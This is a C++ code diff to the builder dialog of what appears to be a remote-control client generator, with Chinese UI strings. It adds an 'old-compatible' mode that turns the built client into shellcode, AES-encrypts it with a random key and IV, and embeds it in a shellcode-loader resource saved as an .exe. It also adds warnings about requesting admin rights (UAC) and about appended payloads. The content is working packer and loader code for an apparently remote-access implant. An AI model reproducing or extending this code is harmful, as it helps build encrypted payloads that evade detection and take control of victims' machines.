@@ -184,6 +184,13 @@ std::string ReleaseEXE(int resID, const char* name)
     return r ? path : "";
 }
 
+typedef struct SCInfoOld {
+    unsigned char aes_key[16];
+    unsigned char aes_iv[16];
+    unsigned char data[4 * 1024 * 1024];
+    int len;
+} SCInfoOld;
+
 typedef struct SCInfo {
     unsigned char aes_key[16];
     unsigned char aes_iv[16];
@@ -480,6 +487,38 @@ void CBuildDlg::OnBnClickedOk()
                 int ret = pe_2_shellcode(strSeverFile.GetString(), strSeverFile.GetString());
                 if (ret)MessageBox(CString("ShellCode 转换异常, 异常代码: ") + CString(std::to_string(ret).c_str()),
                                        "提示", MB_ICONINFORMATION);
+            } else if (m_ComboCompress.GetCurSel() == CLIENT_COMPRESS_SC_AES_OLD) { // 兼容旧版本
+                DWORD dwSize = 0;
+                LPBYTE data = ReadResource(is64bit ? IDR_SCLOADER_X64_OLD : IDR_SCLOADER_X86_OLD, dwSize);
+                if (data) {
+                    int iOffset = MemoryFind((char*)data, (char*)g_ConnectAddress.Flag(), dwSize, g_ConnectAddress.FlagLen());
+                    if (iOffset != -1) {
+                        SCInfoOld* sc = (SCInfoOld*)(data + iOffset);
+                        LPBYTE srcData = (LPBYTE)szBuffer;
+                        int srcLen = dwFileSize;
+                        if (MakeShellcode(srcData, srcLen, (LPBYTE)szBuffer, dwFileSize, true)) {
+                            generate_random_iv(sc->aes_key, 16);
+                            generate_random_iv(sc->aes_iv, 16);
+                            std::string key, iv;
+                            for (int i = 0; i < 16; ++i) key += std::to_string(sc->aes_key[i]) + " ";
+                            for (int i = 0; i < 16; ++i) iv += std::to_string(sc->aes_iv[i]) + " ";
+                            Mprintf("AES_KEY: %s, AES_IV: %s\n", key.c_str(), iv.c_str());
+
+                            struct AES_ctx ctx;
+                            AES_init_ctx_iv(&ctx, sc->aes_key, sc->aes_iv);
+                            AES_CBC_encrypt_buffer(&ctx, srcData, srcLen);
+                            if (srcLen <= 4 * 1024 * 1024) {
+                                memcpy(sc->data, srcData, srcLen);
+                                sc->len = srcLen;
+                            }
+                            SAFE_DELETE_ARRAY(srcData);
+                            PathRenameExtension(strSeverFile.GetBuffer(MAX_PATH), _T(".exe"));
+                            strSeverFile.ReleaseBuffer();
+                            BOOL r = WriteBinaryToFile(strSeverFile.GetString(), (char*)data, dwSize);
+                        }
+                    }
+                }
+                SAFE_DELETE_ARRAY(data);
             }
             int size = m_SliderClientSize.GetPos() * 2.56 * 1024 * 1024;
             if (size > 0) {
@@ -550,6 +589,7 @@ BOOL CBuildDlg::OnInitDialog()
     m_ComboCompress.InsertString(CLIENT_COMPRESS_UPX, "UPX");
     m_ComboCompress.InsertString(CLIENT_COMPRESS_SC_AES, "ShellCode AES");
     m_ComboCompress.InsertString(CLIENT_PE_TO_SEHLLCODE, "PE->ShellCode");
+    m_ComboCompress.InsertString(CLIENT_COMPRESS_SC_AES_OLD, "ShellCode AES<Old>");
     m_ComboCompress.SetCurSel(CLIENT_COMPRESS_NONE);
 
     m_ComboPayload.InsertString(Payload_Self, "载荷写入当前程序尾部");
@@ -669,6 +709,12 @@ void CBuildDlg::OnClientRunasAdmin()
     m_runasAdmin = !m_runasAdmin;
     CMenu* SubMenu = m_MainMenu.GetSubMenu(0);
     SubMenu->CheckMenuItem(ID_CLIENT_RUNAS_ADMIN, m_runasAdmin ? MF_CHECKED : MF_UNCHECKED);
+	static bool warned = false;
+    if (m_runasAdmin && !warned) {
+        warned = true;
+        MessageBox("安装Windows服务必须设置，客户端运行时会请求管理员权限，可能会触发系统UAC提示。\n"
+            "如果未设置，则程序会以当前用户的权限运行，通常也能安装成功。", "提示", MB_ICONINFORMATION);
+    }
 }
 
 
@@ -676,6 +722,13 @@ void CBuildDlg::OnCbnSelchangeComboCompress()
 {
     m_ComboPayload.ShowWindow(m_ComboCompress.GetCurSel() == CLIENT_COMPRESS_SC_AES ? SW_SHOW : SW_HIDE);
     m_StaticPayload.ShowWindow(m_ComboCompress.GetCurSel() == CLIENT_COMPRESS_SC_AES ? SW_SHOW : SW_HIDE);
+    m_ComboPayload.SetFocus();
+	static bool warned = false;
+    if (m_ComboCompress.GetCurSel() == CLIENT_COMPRESS_SC_AES && !warned) {
+		warned = true;
+        MessageBoxA(_T("使用 ShellCode AES 在程序尾部追加载荷，可能无法在某些系统运行! 需切换为 ShellCode AES Old 模式生成!"), 
+            "提示", MB_ICONWARNING);
+	}
 }
 
 BOOL CBuildDlg::OnToolTipNotify(UINT id, NMHDR* pNMHDR, LRESULT* pResult)
